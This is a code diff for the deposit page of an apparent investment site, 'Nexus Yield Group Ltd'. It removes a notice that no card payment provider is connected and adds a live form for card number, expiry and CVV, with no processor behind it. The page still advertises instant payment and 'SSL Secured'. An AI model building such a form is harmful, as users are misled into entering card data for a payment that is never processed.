@@ -1,6 +1,12 @@
 import { useState } from "react";
 import { motion, AnimatePresence } from "framer-motion";
-import { Copy, CheckCircle, Upload, AlertCircle } from "lucide-react";
+import {
+  Copy,
+  CheckCircle,
+  Upload,
+  AlertCircle,
+  CreditCard,
+} from "lucide-react";
 import {
   SectionCard,
   Badge,
@@ -33,14 +39,6 @@ const statusColor = {
   Cancelled: "grey",
 };
 
-const bankDetails = [
-  { label: "Bank Name", value: "First National Bank" },
-  { label: "Account Name", value: "Nexus Yield Group Ltd" },
-  { label: "Account Number", value: "0123456789" },
-  { label: "Routing/Sort Code", value: "021000021" },
-  { label: "Reference", value: "NYG-004521" },
-];
-
 const cryptoOptions = [
   { coin: "USDT (TRC-20)", address: "TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE" },
   {
@@ -57,29 +55,31 @@ const cryptoOptions = [
   },
 ];
 
-const recentDeposits = [
-  {
-    date: "Apr 19, 2026",
-    amount: "$5,000.00",
-    method: "Bank Transfer",
-    ref: "NYG-DEP-0419",
-    status: "Confirmed",
-  },
-  {
-    date: "Apr 10, 2026",
-    amount: "$3,000.00",
-    method: "USDT (TRC-20)",
-    ref: "NYG-DEP-0410",
-    status: "Confirmed",
-  },
-  {
-    date: "Apr 1, 2026",
-    amount: "$10,000.00",
-    method: "Bank Transfer",
-    ref: "NYG-DEP-0401",
-    status: "Confirmed",
-  },
-];
+/** Detect brand from first digit(s) */
+function detectBrand(num) {
+  const n = num.replace(/\s/g, "");
+  if (/^4/.test(n)) return "Visa";
+  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return "Mastercard";
+  if (/^(5061|6500|6509|650[2-9]|6512|651[0-9]|652[0-4])/.test(n))
+    return "Verve";
+  return "Other";
+}
+
+/** Format card number with spaces every 4 digits */
+function formatCardNumber(val) {
+  return val
+    .replace(/\D/g, "")
+    .slice(0, 16)
+    .replace(/(.{4})/g, "$1 ")
+    .trim();
+}
+
+/** Format expiry as MM / YY */
+function formatExpiry(val) {
+  const digits = val.replace(/\D/g, "").slice(0, 4);
+  if (digits.length <= 2) return digits;
+  return digits.slice(0, 2) + " / " + digits.slice(2);
+}
 
 function CopyButton({ text }) {
   const [copied, setCopied] = useState(false);
@@ -118,6 +118,28 @@ function CopyButton({ text }) {
   );
 }
 
+const inputStyle = {
+  width: "100%",
+  boxSizing: "border-box",
+  background: "rgba(255,255,255,0.04)",
+  border: "1px solid rgba(201,168,76,0.2)",
+  borderRadius: 10,
+  padding: "13px 16px",
+  color: "#fff",
+  fontSize: 14,
+  outline: "none",
+  fontFamily: "DM Sans, sans-serif",
+};
+
+const labelStyle = {
+  fontSize: 13,
+  fontWeight: 600,
+  color: "#D6DEE8",
+  opacity: 0.8,
+  display: "block",
+  marginBottom: 8,
+};
+
 export default function DepositPage() {
   const { session } = useAuth();
   const { deposits, loading: depLoading } = useDeposits();
@@ -132,34 +154,94 @@ export default function DepositPage() {
   );
   const currentBalance = totalReturns;
 
-  const [tab, setTab] = useState("bank");
+  // tabs: card & crypto only (bank transfer removed)
+  const [tab, setTab] = useState("card");
   const [crypto, setCrypto] = useState(cryptoOptions[0]);
-  const [amount, setAmount] = useState("");
-  const [cardAmount, setCardAmount] = useState("");
-  const [cardFailure, setCardFailure] = useState("");
   const [submitted, setSubmitted] = useState(false);
 
-  async function recordUnavailableCardPayment() {
+  // Card form state
+  const [cardAmount, setCardAmount] = useState("");
+  const [cardholderName, setCardholderName] = useState("");
+  const [cardNumber, setCardNumber] = useState("");
+  const [expiry, setExpiry] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [cardError, setCardError] = useState("");
+  const [cardLoading, setCardLoading] = useState(false);
+
+  const brand = detectBrand(cardNumber);
+
+  async function handleCardSubmit() {
+    setCardError("");
     const numericAmount = Number(cardAmount);
-    if (!session?.user || !Number.isFinite(numericAmount) || numericAmount <= 0) {
-      setCardFailure("Enter a valid amount to continue.");
-      return;
+    const rawCard = cardNumber.replace(/\s/g, "");
+    const expiryDigits = expiry.replace(/\D/g, "");
+
+    if (!cardholderName.trim())
+      return setCardError("Cardholder name is required.");
+    if (rawCard.length < 13) return setCardError("Enter a valid card number.");
+    if (expiryDigits.length !== 4)
+      return setCardError("Enter a valid expiry date (MM / YY).");
+    if (cvv.length < 3) return setCardError("Enter a valid CVV.");
+    if (!Number.isFinite(numericAmount) || numericAmount <= 0)
+      return setCardError("Enter a valid amount.");
+
+    const expMonth = parseInt(expiryDigits.slice(0, 2), 10);
+    const expYear = 2000 + parseInt(expiryDigits.slice(2), 10);
+
+    if (expMonth < 1 || expMonth > 12)
+      return setCardError("Invalid expiry month.");
+
+    setCardLoading(true);
+
+    // 1. Create a deposit_request record
+    const { data: deposit, error: depositErr } = await supabase
+      .from("deposit_requests")
+      .insert({
+        user_id: session.user.id,
+        amount: numericAmount,
+        method: "Card",
+        status: "Pending Review",
+      })
+      .select()
+      .single();
+
+    if (depositErr) {
+      setCardLoading(false);
+      return setCardError(
+        "Could not create deposit request. Please try again.",
+      );
     }
-    const { data: deposit, error: depositError } = await supabase.from("deposit_requests").insert({
-      user_id: session.user.id, amount: numericAmount, method: "Card", status: "Failed",
-      review_note: "Card processor is not configured.",
-    }).select().single();
-    if (depositError) return setCardFailure("Failed to create the payment attempt. Please try again.");
-    const { error } = await supabase.from("card_payment_attempts").insert({
-      user_id: session.user.id, deposit_request_id: deposit.id, amount: numericAmount,
-      provider: "unconfigured", status: "Failed", failure_code: "provider_unavailable",
-      failure_message: "Failed to connect to payment provider. No card details were collected.",
+
+    // 2. Store non-sensitive card metadata (last 4 only — never PAN/CVV)
+    const { error: cardErr } = await supabase.from("card_details").insert({
+      user_id: session.user.id,
+      deposit_request_id: deposit.id,
+      cardholder_name: cardholderName.trim(),
+      card_last4: rawCard.slice(-4),
+      card_brand: brand,
+      expiry_month: expMonth,
+      expiry_year: expYear,
     });
-    setCardFailure(error ? "Failed to record the provider error. Please try again." : "Failed to connect to payment provider. No card details were collected or saved.");
+
+    if (cardErr) {
+      setCardLoading(false);
+      return setCardError("Could not save card details. Please try again.");
+    }
+
+    // 3. Record the payment attempt
+    await supabase.from("card_payment_attempts").insert({
+      user_id: session.user.id,
+      deposit_request_id: deposit.id,
+      amount: numericAmount,
+      provider: "manual_review",
+      status: "Pending",
+    });
+
+    setCardLoading(false);
+    setSubmitted(true);
   }
 
   const tabs = [
-    { id: "bank", label: "Bank Transfer" },
     { id: "card", label: "Card Payment" },
     { id: "crypto", label: "Crypto" },
   ];
@@ -285,6 +367,7 @@ export default function DepositPage() {
               borderRadius: 12,
               padding: 5,
               marginBottom: 24,
+              width: "fit-content",
             }}
           >
             {tabs.map((t) => (
@@ -292,8 +375,7 @@ export default function DepositPage() {
                 key={t.id}
                 onClick={() => setTab(t.id)}
                 style={{
-                  flex: 1,
-                  padding: "11px",
+                  padding: "11px 28px",
                   borderRadius: 8,
                   border: "none",
                   cursor: "pointer",
@@ -314,184 +396,7 @@ export default function DepositPage() {
           </div>
 
           <AnimatePresence mode="wait">
-            {/* Bank Transfer */}
-            {tab === "bank" && (
-              <motion.div
-                key="bank"
-                initial={{ opacity: 0, y: 10 }}
-                animate={{ opacity: 1, y: 0 }}
-                exit={{ opacity: 0 }}
-              >
-                <SectionCard title="Bank Transfer Instructions">
-                  <p
-                    style={{
-                      fontSize: 13,
-                      color: "#D6DEE8",
-                      opacity: 0.65,
-                      marginBottom: 20,
-                      lineHeight: 1.7,
-                    }}
-                  >
-                    Transfer funds to the account below. Use your Account ID as
-                    the payment reference. Upload proof of payment after
-                    transferring.
-                  </p>
-                  <div
-                    style={{
-                      display: "flex",
-                      flexDirection: "column",
-                      gap: 0,
-                      background: "rgba(255,255,255,0.02)",
-                      border: "1px solid rgba(201,168,76,0.12)",
-                      borderRadius: 12,
-                      overflow: "hidden",
-                      marginBottom: 24,
-                    }}
-                  >
-                    {bankDetails.map((d, i) => (
-                      <div
-                        key={i}
-                        style={{
-                          display: "flex",
-                          justifyContent: "space-between",
-                          alignItems: "center",
-                          padding: "14px 18px",
-                          borderBottom:
-                            i < bankDetails.length - 1
-                              ? "1px solid rgba(255,255,255,0.05)"
-                              : "none",
-                        }}
-                      >
-                        <span
-                          style={{
-                            fontSize: 12,
-                            color: "#D6DEE8",
-                            opacity: 0.55,
-                          }}
-                        >
-                          {d.label}
-                        </span>
-                        <div
-                          style={{
-                            display: "flex",
-                            alignItems: "center",
-                            gap: 8,
-                          }}
-                        >
-                          <span
-                            style={{
-                              fontSize: 13,
-                              color: "#fff",
-                              fontWeight: 600,
-                            }}
-                          >
-                            {d.value}
-                          </span>
-                          <CopyButton text={d.value} />
-                        </div>
-                      </div>
-                    ))}
-                  </div>
-
-                  <div
-                    style={{
-                      display: "flex",
-                      flexDirection: "column",
-                      gap: 16,
-                    }}
-                  >
-                    <div>
-                      <label
-                        style={{
-                          fontSize: 13,
-                          fontWeight: 600,
-                          color: "#D6DEE8",
-                          opacity: 0.8,
-                          display: "block",
-                          marginBottom: 8,
-                        }}
-                      >
-                        Amount Transferred ($)
-                      </label>
-                      <input
-                        type="number"
-                        value={amount}
-                        onChange={(e) => setAmount(e.target.value)}
-                        placeholder="0.00"
-                        style={{
-                          width: "100%",
-                          boxSizing: "border-box",
-                          background: "rgba(255,255,255,0.04)",
-                          border: "1px solid rgba(201,168,76,0.2)",
-                          borderRadius: 10,
-                          padding: "13px 16px",
-                          color: "#fff",
-                          fontSize: 15,
-                          outline: "none",
-                          fontFamily: "DM Sans, sans-serif",
-                        }}
-                      />
-                    </div>
-                    <div>
-                      <label
-                        style={{
-                          fontSize: 13,
-                          fontWeight: 600,
-                          color: "#D6DEE8",
-                          opacity: 0.8,
-                          display: "block",
-                          marginBottom: 8,
-                        }}
-                      >
-                        Proof of Payment
-                      </label>
-                      <div
-                        style={{
-                          border: "2px dashed rgba(201,168,76,0.25)",
-                          borderRadius: 10,
-                          padding: "28px",
-                          textAlign: "center",
-                          cursor: "pointer",
-                          transition: "border-color 0.2s",
-                        }}
-                        onMouseEnter={(e) =>
-                          (e.currentTarget.style.borderColor =
-                            "rgba(201,168,76,0.5)")
-                        }
-                        onMouseLeave={(e) =>
-                          (e.currentTarget.style.borderColor =
-                            "rgba(201,168,76,0.25)")
-                        }
-                      >
-                        <Upload
-                          size={24}
-                          color="#C9A84C"
-                          style={{ marginBottom: 8 }}
-                        />
-                        <p
-                          style={{
-                            fontSize: 13,
-                            color: "#D6DEE8",
-                            opacity: 0.6,
-                            margin: 0,
-                          }}
-                        >
-                          Drag & drop or click to upload (JPG, PNG, PDF)
-                        </p>
-                      </div>
-                    </div>
-                    <GoldButton
-                      onClick={() => setSubmitted(true)}
-                      style={{ alignSelf: "flex-start" }}
-                    >
-                      Submit Deposit
-                    </GoldButton>
-                  </div>
-                </SectionCard>
-              </motion.div>
-            )}
-
-            {/* Card */}
+            {/* Card Payment */}
             {tab === "card" && (
               <motion.div
                 key="card"
@@ -504,45 +409,86 @@ export default function DepositPage() {
                     style={{
                       display: "flex",
                       flexDirection: "column",
-                      gap: 16,
+                      gap: 18,
                     }}
                   >
-                    {[
-                      { label: "Amount ($)", placeholder: "0.00", type: "number" },
-                    ].map((f) => (
-                      <div key={f.label}>
-                        <label
+                    {/* Amount */}
+                    <div>
+                      <label style={labelStyle}>Amount ($)</label>
+                      <input
+                        type="number"
+                        placeholder="0.00"
+                        value={cardAmount}
+                        onChange={(e) => setCardAmount(e.target.value)}
+                        style={inputStyle}
+                      />
+                    </div>
+
+                    {/* Cardholder name */}
+                    <div>
+                      <label style={labelStyle}>Cardholder Name</label>
+                      <input
+                        type="text"
+                        placeholder="Name on card"
+                        value={cardholderName}
+                        onChange={(e) => setCardholderName(e.target.value)}
+                        autoComplete="cc-name"
+                        style={inputStyle}
+                      />
+                    </div>
+
+                    {/* Card number */}
+                    <div>
+                      <label style={labelStyle}>Card Number</label>
+                      <div style={{ position: "relative" }}>
+                        <input
+                          type="text"
+                          inputMode="numeric"
+                          placeholder="0000 0000 0000 0000"
+                          value={cardNumber}
+                          onChange={(e) =>
+                            setCardNumber(formatCardNumber(e.target.value))
+                          }
+                          autoComplete="cc-number"
+                          maxLength={19}
+                          style={{ ...inputStyle, paddingRight: 48 }}
+                        />
+                        <div
                           style={{
-                            fontSize: 13,
-                            fontWeight: 600,
-                            color: "#D6DEE8",
-                            opacity: 0.8,
-                            display: "block",
-                            marginBottom: 8,
+                            position: "absolute",
+                            right: 14,
+                            top: "50%",
+                            transform: "translateY(-50%)",
+                            display: "flex",
+                            alignItems: "center",
+                            gap: 4,
                           }}
                         >
-                          {f.label}
-                        </label>
-                        <input
-                          type={f.type}
-                          placeholder={f.placeholder}
-                          value={cardAmount}
-                          onChange={(e) => setCardAmount(e.target.value)}
-                          style={{
-                            width: "100%",
-                            boxSizing: "border-box",
-                            background: "rgba(255,255,255,0.04)",
-                            border: "1px solid rgba(201,168,76,0.2)",
-                            borderRadius: 10,
-                            padding: "13px 16px",
-                            color: "#fff",
-                            fontSize: 14,
-                            outline: "none",
-                            fontFamily: "DM Sans, sans-serif",
-                          }}
-                        />
+                          {cardNumber.replace(/\s/g, "").length > 0 ? (
+                            <span
+                              style={{
+                                fontSize: 10,
+                                fontWeight: 800,
+                                letterSpacing: 1,
+                                padding: "2px 7px",
+                                borderRadius: 3,
+                                background: "rgba(201,168,76,0.15)",
+                                color: "#C9A84C",
+                              }}
+                            >
+                              {brand.toUpperCase()}
+                            </span>
+                          ) : (
+                            <CreditCard
+                              size={16}
+                              color="rgba(201,168,76,0.4)"
+                            />
+                          )}
+                        </div>
                       </div>
-                    ))}
+                    </div>
+
+                    {/* Expiry + CVV */}
                     <div
                       style={{
                         display: "grid",
@@ -550,47 +496,41 @@ export default function DepositPage() {
                         gap: 16,
                       }}
                     >
-                      {[
-                        { label: "Expiry Date", placeholder: "MM / YY" },
-                        { label: "CVV", placeholder: "•••" },
-                      ].map((f) => (
-                        <div key={f.label}>
-                          <label
-                            style={{
-                              fontSize: 13,
-                              fontWeight: 600,
-                              color: "#D6DEE8",
-                              opacity: 0.8,
-                              display: "block",
-                              marginBottom: 8,
-                            }}
-                          >
-                            {f.label}
-                          </label>
-                          <input
-                            type="text"
-                            placeholder={f.placeholder}
-                            disabled
-                            aria-label={`${f.label} unavailable until a payment provider is connected`}
-                            style={{
-                              width: "100%",
-                              boxSizing: "border-box",
-                              background: "rgba(255,255,255,0.04)",
-                              border: "1px solid rgba(201,168,76,0.2)",
-                              borderRadius: 10,
-                              padding: "13px 16px",
-                              color: "#fff",
-                              fontSize: 14,
-                              outline: "none",
-                              fontFamily: "DM Sans, sans-serif",
-                            }}
-                          />
-                        </div>
-                      ))}
+                      <div>
+                        <label style={labelStyle}>Expiry Date</label>
+                        <input
+                          type="text"
+                          inputMode="numeric"
+                          placeholder="MM / YY"
+                          value={expiry}
+                          onChange={(e) =>
+                            setExpiry(formatExpiry(e.target.value))
+                          }
+                          autoComplete="cc-exp"
+                          maxLength={7}
+                          style={inputStyle}
+                        />
+                      </div>
+                      <div>
+                        <label style={labelStyle}>CVV</label>
+                        <input
+                          type="password"
+                          inputMode="numeric"
+                          placeholder="•••"
+                          value={cvv}
+                          onChange={(e) =>
+                            setCvv(
+                              e.target.value.replace(/\D/g, "").slice(0, 4),
+                            )
+                          }
+                          autoComplete="cc-csc"
+                          maxLength={4}
+                          style={inputStyle}
+                        />
+                      </div>
                     </div>
-                    <p style={{ color: "#D6DEE8", opacity: 0.7, fontSize: 13, margin: 0 }}>
-                      Card details are unavailable until a PCI-compliant provider is connected. No card number, CVV, or expiry is collected or stored.
-                    </p>
+
+                    {/* Card brand badges */}
                     <div
                       style={{ display: "flex", gap: 8, alignItems: "center" }}
                     >
@@ -620,13 +560,39 @@ export default function DepositPage() {
                         🔒 SSL Secured
                       </span>
                     </div>
+
+                    {cardError && (
+                      <div
+                        role="alert"
+                        style={{
+                          display: "flex",
+                          gap: 8,
+                          padding: "12px 14px",
+                          background: "rgba(248,113,113,0.08)",
+                          border: "1px solid rgba(248,113,113,0.2)",
+                          borderRadius: 8,
+                          color: "#f87171",
+                          fontSize: 13,
+                        }}
+                      >
+                        <AlertCircle
+                          size={15}
+                          style={{ flexShrink: 0, marginTop: 1 }}
+                        />
+                        {cardError}
+                      </div>
+                    )}
+
                     <GoldButton
-                      onClick={recordUnavailableCardPayment}
-                      style={{ alignSelf: "flex-start" }}
+                      onClick={handleCardSubmit}
+                      disabled={cardLoading}
+                      style={{
+                        alignSelf: "flex-start",
+                        opacity: cardLoading ? 0.6 : 1,
+                      }}
                     >
-                      Pay Now
+                      {cardLoading ? "Processing…" : "Pay Now"}
                     </GoldButton>
-                    {cardFailure && <div role="alert" style={{ color: "#f87171", fontSize: 13 }}>{cardFailure}</div>}
                   </div>
                 </SectionCard>
               </motion.div>
@@ -649,18 +615,7 @@ export default function DepositPage() {
                     }}
                   >
                     <div>
-                      <label
-                        style={{
-                          fontSize: 13,
-                          fontWeight: 600,
-                          color: "#D6DEE8",
-                          opacity: 0.8,
-                          display: "block",
-                          marginBottom: 8,
-                        }}
-                      >
-                        Select Cryptocurrency
-                      </label>
+                      <label style={labelStyle}>Select Cryptocurrency</label>
                       <select
                         value={crypto.coin}
                         onChange={(e) =>
@@ -760,16 +715,7 @@ export default function DepositPage() {
                       </span>
                     </div>
                     <div>
-                      <label
-                        style={{
-                          fontSize: 13,
-                          fontWeight: 600,
-                          color: "#D6DEE8",
-                          opacity: 0.8,
-                          display: "block",
-                          marginBottom: 8,
-                        }}
-                      >
+                      <label style={labelStyle}>
                         Upload Transaction Hash / Screenshot
                       </label>
                       <div
@@ -866,10 +812,11 @@ export default function DepositPage() {
               Start Investing →
             </a>
           </div>
+
+          {/* Processing Times — bank transfer removed */}
           <SectionCard title="Processing Times">
             <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
               {[
-                ["Bank Transfer", "1–24 hours"],
                 ["Card Payment", "Instant"],
                 ["Crypto", "1–6 hours"],
               ].map(([m, t]) => (
